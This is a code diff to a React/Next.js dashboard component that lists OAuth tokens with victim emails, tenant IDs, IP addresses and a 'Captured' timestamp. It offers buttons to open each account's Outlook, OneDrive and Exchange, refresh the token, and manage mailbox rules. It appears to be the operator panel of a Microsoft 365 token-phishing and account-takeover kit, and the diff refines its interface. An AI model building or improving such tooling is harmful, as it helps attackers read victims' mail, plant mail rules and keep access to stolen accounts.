@@ -12,10 +12,6 @@ import {
   Globe,
   HardDrive,
   Users,
-  Shield,
-  FileText,
-  Table2,
-  Presentation,
   ExternalLink,
   Clock,
   MapPin,
@@ -28,7 +24,7 @@ import {
 } from "lucide-react";
 import { Token } from "@/types/token";
 import { formatDistanceToNow, isPast } from "date-fns";
-import { deleteTokens, refreshToken, killSession } from "@/lib/api";
+import { deleteTokens, refreshToken } from "@/lib/api";
 import { useRouter } from "next/navigation";
 import { toast } from "sonner";
 import { TokenTableSkeleton } from "@/components/ui/loading-skeleton";
@@ -44,7 +40,9 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
   const router = useRouter();
   const [search, setSearch] = useState("");
   const [refreshingId, setRefreshingId] = useState<string | null>(null);
-  const [killingId, setKillingId] = useState<string | null>(null);
+  const [hoveredId, setHoveredId] = useState<string | null>(null);
+  const [actionLoadingId, setActionLoadingId] = useState<string | null>(null);
+  const [actionLoadingType, setActionLoadingType] = useState<string | null>(null);
 
 
   const filtered = useMemo(() => {
@@ -63,7 +61,8 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
   const revokedCount = tokens.filter((t) => isPast(new Date(t.expires_at))).length;
 
   const handleRefresh = async (token: Token) => {
-    setRefreshingId(token.id);
+    setActionLoadingId(token.id);
+    setActionLoadingType("refresh");
     try {
       const result = await refreshToken(token.id);
       if (result.success) {
@@ -75,23 +74,12 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
     } catch (e: any) {
       toast.error("Error", { description: e.message });
     } finally {
-      setRefreshingId(null);
+      setActionLoadingId(null);
+      setActionLoadingType(null);
     }
   };
 
-  const handleKillSession = async (token: Token) => {
-    if (!confirm("Kill this session? This will revoke the OAuth token.")) return;
-    setKillingId(token.id);
-    try {
-      const result = await killSession(token.id);
-      toast.success("Session killed", { description: result.message });
-      onRefresh();
-    } catch (e: any) {
-      toast.error("Failed to kill session", { description: e.message });
-    } finally {
-      setKillingId(null);
-    }
-  };
+
 
   const openApp = (token: Token, app: string) => {
     const base = `/outlook/${token.id}`;
@@ -132,14 +120,7 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
     return "active";
   };
 
-  const getSessionStatus = (token: Token) => {
-    const status = token.session_status || "pending";
-    if (status === "active") return { label: "Session Active", color: "bg-emerald-500/20 text-emerald-400 border-emerald-500/30", icon: "●" };
-    if (status === "pending") return { label: "Session Pending", color: "bg-amber-500/20 text-amber-400 border-amber-500/30", icon: "◐" };
-    if (status === "expired") return { label: "Session Expired", color: "bg-rose-500/20 text-rose-400 border-rose-500/30", icon: "○" };
-    if (status === "killed") return { label: "Session Killed", color: "bg-gray-500/20 text-gray-400 border-gray-500/30", icon: "✕" };
-    return { label: "No Session", color: "bg-gray-500/20 text-gray-400 border-gray-500/30", icon: "○" };
-  };
+
 
   const getRefreshedText = (token: Token) => {
     if (token.last_refreshed_at) {
@@ -214,8 +195,10 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
                   exit={{ opacity: 0, scale: 0.95 }}
                   transition={{ delay: index * 0.05, duration: 0.2 }}
                   className="group rounded-xl border border-white/5 bg-[#0f0f23]/80 hover:bg-[#1a1a3e]/80 transition-all duration-300 p-4"
+                  onMouseEnter={() => setHoveredId(token.id)}
+                  onMouseLeave={() => setHoveredId(null)}
                 >
-                  {/* Row Header */}
+                  {/* Collapsible Row Content */}
                   <div className="flex items-start justify-between gap-4">
                     <div className="flex-1 min-w-0">
                       {/* Email & Status */}
@@ -234,58 +217,14 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
                             REVOKED
                           </Badge>
                         )}
-                         {/* Session Status Badge */}
-                         {(() => {
-                           const session = getSessionStatus(token);
-                           return (
-                             <Badge className={`${session.color} text-[10px] px-2 py-0 border`}>
-                               <span className="mr-1">{session.icon}</span>
-                               {session.label}
-                             </Badge>
-                           );
-                         })()}
-
                       </div>
                       
-                      {/* Refreshed ago */}
-                      <p className="text-[11px] text-muted-foreground mb-2">
-                        {getRefreshedText(token)}
-                      </p>
-
-                      {/* Office App Buttons */}
-                      <div className="flex flex-wrap gap-1.5 mb-3">
-                        {[
-                          { name: "ONEDRIVE", icon: HardDrive, color: "bg-blue-500/20 text-blue-400 border-blue-500/30" },
-                          { name: "TEAMS", icon: Users, color: "bg-purple-500/20 text-purple-400 border-purple-500/30" },
-                          { name: "ADMIN", icon: Shield, color: "bg-orange-500/20 text-orange-400 border-orange-500/30" },
-                          { name: "EXCHANGE", icon: Mail, color: "bg-cyan-500/20 text-cyan-400 border-cyan-500/30" },
-                          { name: "WORD", icon: FileText, color: "bg-blue-500/20 text-blue-400 border-blue-500/30" },
-                          { name: "EXCEL", icon: Table2, color: "bg-green-500/20 text-green-400 border-green-500/30" },
-                          { name: "POWERPOINT", icon: Presentation, color: "bg-orange-500/20 text-orange-400 border-orange-500/30" },
-                        ].map((app) => (
-                          <button
-                            key={app.name}
-                            onClick={() => openApp(token, app.name)}
-                            className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[10px] font-medium border ${app.color} hover:opacity-80 transition-opacity`}
-                          >
-                            <app.icon className="h-3 w-3" />
-                            {app.name}
-                          </button>
-                        ))}
-                      </div>
-
-                      {/* Meta Info */}
-                      <div className="flex flex-wrap items-center gap-x-4 gap-y-1 text-[11px] text-muted-foreground">
+                      {/* Collapsed view: only show meta info */}
+                      <div className="flex flex-wrap items-center gap-x-3 gap-y-1 text-[11px] text-muted-foreground">
                         {token.tenant_id && (
                           <span className="flex items-center gap-1">
                             <Building2 className="h-3 w-3" />
-                            Tenant: {token.tenant_id}
-                          </span>
-                        )}
-                        {token.category && (
-                          <span className="flex items-center gap-1">
-                            <Globe className="h-3 w-3" />
-                            Category: {token.category}
+                            {token.tenant_id}
                           </span>
                         )}
                         {token.ip_address && (
@@ -302,59 +241,86 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
                         )}
                         <span className="flex items-center gap-1">
                           <Clock className="h-3 w-3" />
-                          Captured {token.created_at ? formatDistanceToNow(new Date(token.created_at), { addSuffix: true }) : "unknown"}
+                          {token.created_at ? formatDistanceToNow(new Date(token.created_at), { addSuffix: true }) : "unknown"}
                         </span>
                       </div>
+
+                      {/* Expanded view: show more details and buttons */}
+                      {(index === 0 || hoveredId === token.id) && (
+                        <>
+                          {/* Refreshed ago */}
+                          <p className="text-[11px] text-muted-foreground mt-2 mb-2">
+                            {getRefreshedText(token)}
+                          </p>
+
+                          {/* Functional App Buttons Only */}
+                          <div className="flex flex-wrap gap-1.5 mb-3">
+                            {[
+                              { name: "ONEDRIVE", color: "bg-blue-500/20 text-blue-400 border-blue-500/30" },
+                              { name: "EXCHANGE", color: "bg-cyan-500/20 text-cyan-400 border-cyan-500/30" },
+                            ].map((app) => (
+                              <button
+                                key={app.name}
+                                onClick={() => openApp(token, app.name)}
+                                className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[10px] font-medium border ${app.color} hover:opacity-80 transition-opacity`}
+                              >
+                                {app.name}
+                              </button>
+                            ))}
+                          </div>
+                        </>
+                      )}
                     </div>
 
                     {/* Actions */}
                     <div className="flex items-center gap-2 shrink-0">
                       <button
                         onClick={() => openApp(token, "OUTLOOK")}
-                        className="inline-flex items-center gap-1.5 px-4 py-2 rounded-lg bg-[#0078d4]/20 text-[#0078d4] border border-[#0078d4]/30 text-xs font-medium hover:bg-[#0078d4]/30 transition-colors"
+                        disabled={actionLoadingId === token.id && actionLoadingType === "outlook"}
+                        className="inline-flex items-center gap-1.5 px-4 py-2 rounded-lg bg-[#0078d4]/20 text-[#0078d4] border border-[#0078d4]/30 text-xs font-medium hover:bg-[#0078d4]/30 transition-colors disabled:opacity-50"
                       >
-                        <ExternalLink className="h-3.5 w-3.5" />
+                        {actionLoadingId === token.id && actionLoadingType === "outlook" ? (
+                          <RefreshCw className="h-3.5 w-3.5 animate-spin" />
+                        ) : (
+                          <ExternalLink className="h-3.5 w-3.5" />
+                        )}
                         OUTLOOK
                       </button>
                       
-                       <button
-                         onClick={() => router.push(`/rules/${token.id}`)}
-                         className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg bg-amber-500/10 text-amber-400 border border-amber-500/20 text-xs font-medium hover:bg-amber-500/20 transition-colors"
-                         title="Manage rules"
-                       >
-                         <Gavel className="h-3.5 w-3.5" />
-                         Rules
-                       </button>
-                       
-                        {/* Kill Session Button */}
-                        {token.session_status === "active" && (
-                          <button
-                            onClick={() => handleKillSession(token)}
-                            disabled={killingId === token.id}
-                            className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg bg-rose-500/10 text-rose-400 border border-rose-500/20 text-xs font-medium hover:bg-rose-500/20 transition-colors disabled:opacity-50"
-                            title="Kill session and revoke OAuth token"
-                          >
-                            <XCircle className={`h-3.5 w-3.5 ${killingId === token.id ? "animate-spin" : ""}`} />
-                            Kill Session
-                          </button>
+                      <button
+                        onClick={() => router.push(`/rules/${token.id}`)}
+                        disabled={actionLoadingId === token.id && actionLoadingType === "rules"}
+                        className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg bg-amber-500/10 text-amber-400 border border-amber-500/20 text-xs font-medium hover:bg-amber-500/20 transition-colors disabled:opacity-50"
+                        title="Manage rules"
+                      >
+                        {actionLoadingId === token.id && actionLoadingType === "rules" ? (
+                          <RefreshCw className="h-3.5 w-3.5 animate-spin" />
+                        ) : (
+                          <Gavel className="h-3.5 w-3.5" />
                         )}
+                        Rules
+                      </button>
                       
                       <button
                         onClick={() => handleRefresh(token)}
-                        disabled={refreshingId === token.id}
+                        disabled={actionLoadingId === token.id && actionLoadingType === "refresh"}
                         className="p-2 rounded-lg border border-white/10 hover:bg-white/5 transition-colors disabled:opacity-50"
                         title="Refresh token"
                       >
-                        <RefreshCw className={`h-4 w-4 text-emerald-400 ${refreshingId === token.id ? "animate-spin" : ""}`} />
+                        <RefreshCw className={`h-4 w-4 text-emerald-400 ${actionLoadingId === token.id && actionLoadingType === "refresh" ? "animate-spin" : ""}`} />
                       </button>
                       
                       <button
                         onClick={() => {
                           if (confirm("Delete this token?")) {
-                            deleteTokens([token.id]).then(() => {
-                              toast.success("Token deleted");
-                              onRefresh();
-                            });
+                            deleteTokens([token.id])
+                              .then(() => {
+                                toast.success("Token deleted");
+                                onRefresh();
+                              })
+                              .catch((e: any) => {
+                                toast.error("Delete failed", { description: e.message || "Unknown error" });
+                              });
                           }
                         }}
                         className="p-2 rounded-lg border border-white/10 hover:bg-rose-500/10 transition-colors"
